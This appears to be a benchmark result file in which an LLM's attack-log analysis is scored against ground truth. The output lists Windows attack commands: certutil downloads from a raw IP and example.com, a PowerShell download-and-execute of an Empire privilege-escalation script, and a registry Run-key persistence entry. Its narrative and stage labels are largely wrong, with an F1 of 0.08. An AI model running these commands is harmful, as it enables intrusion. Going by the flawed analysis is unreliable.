@@ -1,0 +1,94 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/test.hta C:\\Users\\Administrator\\Desktop\\shell\\test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "reg.exe add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\\\WINDOWS\\\\System32\\\\svchost.exe -k Netzwerk-Dienste -p -s DnsApi",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\4iwlyhn4\\\\4iwlyhn4.cmdline\\\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C IEX (IWR \\'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1\\' -UseBasicParsing).Get-System -Technique NamedPipe -Verbose",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Start-Process .\\.T1059.003_script.bat",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "c:\\\\Windows\\\\system32\\\\cmd.exe /c \\\", ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "CERTUTIL.EXE -URLCACHE -SPLIT -F http://example.com/x.exe C:\\x.exe",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "A sophisticated cyberattack unfolded across four separate systems. Initially, attackers used CertUtil to fetch malware binaries, leading to exploitation of vulnerabilities in browsers like Google Chrome and Microsoft Edge. After achieving initial access, malware established persistence through modifications to registry entries, scheduled tasks, and DLL creation, utilizing tools like reg.exe, powershell.exe, and csc.exe. As lateral movement occurred, attackers communicated with command centers via protocols like HTTP, allowing them to further escalate privileges using techniques such as named pipe injection and modifying Windows debugging functions via Structured Exception Handler Overwrite (SEHO) manipulation.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 120992,
+      "completion_tokens": 10224,
+      "total_tokens": 131216,
+      "wall_clock_s": 143.194,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.09090909090909091,
+      "recall": 0.07142857142857142,
+      "f1": 0.08,
+      "tp": 1,
+      "fp": 10,
+      "fn": 13
+    },
+    "stage": {
+      "precision": 0.09090909090909091,
+      "recall": 0.07142857142857142,
+      "f1": 0.08,
+      "tp": 1,
+      "fp": 10,
+      "fn": 13,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.25,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 120992,
+      "completion_tokens": 10224,
+      "total_tokens": 131216,
+      "wall_clock_s": 143.194,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
